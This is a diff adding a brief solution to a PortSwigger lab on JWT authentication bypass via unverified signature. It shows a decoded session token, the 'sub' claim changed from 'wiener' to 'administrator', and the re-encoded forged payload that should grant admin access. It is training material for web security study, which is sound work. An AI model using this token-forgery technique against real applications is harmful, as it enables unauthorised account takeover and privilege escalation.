@@ -1,0 +1,26 @@
+The steps below are meant to solve the following lab:
+https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature
+
+Session cookie after JWT decode:
+{
+    "iss": "portswigger",
+    "sub": "wiener",
+    "exp": 1689707626
+}
+
+Header and payload of JWT token:
+eyJraWQiOiI4ZWQzZGZlNi05MDY4LTRiNDgtYTU2OS1lNjBlMjg2YmRjNjEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4OTcwNzYyNn0
+
+Just the payload:
+eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4OTcwNzYyNn0
+
+Payload after decode:
+{"iss":"portswigger","sub":"wiener","exp":1689707626}
+
+Payload after changing sub key's value to administrator:
+{"iss":"portswigger","sub":"administrator","exp":1689707626}
+
+Payload after Base 64 encoding:
+eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODk3MDc2MjZ9
+
+After replacing original payload with eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODk3MDc2MjZ9, the admin panel should become accessible.
